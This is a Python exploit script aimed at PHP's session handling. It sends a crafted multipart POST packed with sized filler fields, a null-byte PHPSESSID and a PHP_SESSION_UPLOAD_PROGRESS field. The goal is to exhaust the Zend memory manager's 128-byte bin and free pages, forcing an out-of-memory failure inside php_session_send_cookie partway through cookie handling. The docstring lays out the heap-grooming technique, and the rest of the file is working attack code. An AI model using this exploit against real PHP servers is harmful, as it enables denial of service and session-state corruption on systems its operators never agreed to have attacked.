#!/usr/bin/env python3
"""OOM-in-cookie A: exhaust Zend MM bin 128 and all free pages before FILE_START.

usage: send_a_oom4.py F NB BL K KL FL [FN]
  F  : bin-128 filler fields (field name and value both 103 bytes -> 25+103 = 128)
  NB : big fields, BL-byte values (short numeric names)
  K  : tail fields, KL-byte values (short numeric names; KL~4000 => 1 page each)
  FL : file part field-name length (filename is 103 bytes -> two bin-128 strings
       are allocated at FILE_START, consuming the last two free 128B slots)
  FN : optional file part field name (default: 'F' * FL)

Total POST vars F+NB+K+2 must stay <= max_input_vars (1000).

Target state at php_session_send_cookie() entry:
  * heap->free_slot[11] == NULL      (bin 128 exhausted)
  * sum(chunk->free_pages) == 0      (no page for a new 128B run)
Then php_url_encode()'s zend_string_safe_alloc(3, 32, 0, 0) (121B -> bin 128)
fails inside php_session_send_cookie, after PS(send_cookie)=1 was set and
before it is cleared, with no output / no display_errors dependency.
"""
import socket
import sys

if len(sys.argv) < 7:
    sys.exit(__doc__)
F, NB, BL, K, KL, FL = map(int, sys.argv[1:7])
FN = sys.argv[7] if len(sys.argv) > 7 else 'F' * FL
assert F + NB + K + 2 <= 1000, "too many vars for max_input_vars=1000"

BND = b'S' * 17
parts = []


def padded(prefix, i, n):
    s = '%s%04d' % (prefix, i)
    return (s + 'x' * n)[:n]


for i in range(F):
    parts.append((padded('f', i, 103), None, b'V' * 103))
idx = 1000
for _ in range(NB):
    parts.append((str(idx), None, b'B' * BL))
    idx += 1
idx = 200000
for _ in range(K):
    parts.append((str(idx), None, b'T' * KL))
    idx += 1
parts.append(('PHPSESSID', None, b'\x00'))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS', None, b'pwn'))
parts.append((FN, 'A' * 99 + '.txt', b'A' * 64))

o = bytearray()
for name, filename, data in parts:
    o += b'--' + BND + b'\r\n'
    if filename is not None:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"; filename="' + filename.encode() + b'"\r\n'
              b'Content-Type: application/octet-stream\r\n\r\n')
    else:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"\r\n\r\n')
    o += data + b'\r\n'
o += b'--' + BND + b'--\r\n'

req = (('POST /index.php HTTP/1.1\r\n'
        'Host: 127.0.0.1:8088\r\n'
        'Content-Type: multipart/form-data; boundary=%s\r\n'
        'Content-Length: %d\r\n'
        'Connection: close\r\n\r\n') % (BND.decode(), len(o))).encode()
s = socket.create_connection(('127.0.0.1', 8088), timeout=60)
s.settimeout(60)
resp = b''
try:
    s.sendall(req + bytes(o))
    while len(resp) < 200000:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except OSError:
    pass
s.close()
open('/tmp/a_oom4.resp', 'wb').write(resp)
print('RESP_LEN', len(resp))
for line in resp.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE', line[:120].decode('latin1', 'replace'))
